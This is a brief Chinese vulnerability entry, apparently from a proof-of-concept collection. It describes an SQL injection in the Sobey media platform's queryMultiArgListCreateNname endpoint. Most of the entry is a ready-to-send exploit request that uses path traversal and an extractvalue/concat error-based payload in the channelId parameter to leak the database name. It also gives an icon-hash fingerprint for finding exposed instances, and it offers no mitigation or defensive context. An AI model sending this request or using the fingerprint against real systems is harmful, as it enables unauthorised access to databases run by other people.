# 索贝融媒体queryMultiArgListCreateNname存在SQL注入漏洞

- **系统**：索贝融媒体　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`icon_hash="689611853"`
- **请求**：`GET /sobey-mchEditor/mch/statistics/js/../queryMultiArgListCreateNname?channelId=1+and+extractvalue%281%2Cconcat%280x7e%2Cdatabase%28%29%29%29&siteCode=1&token=1&parameter=editor HTTP/1.1`
- **关键头**：`Content-Type: application/x-www-form-urlencoded`
- **预期**：200　|　—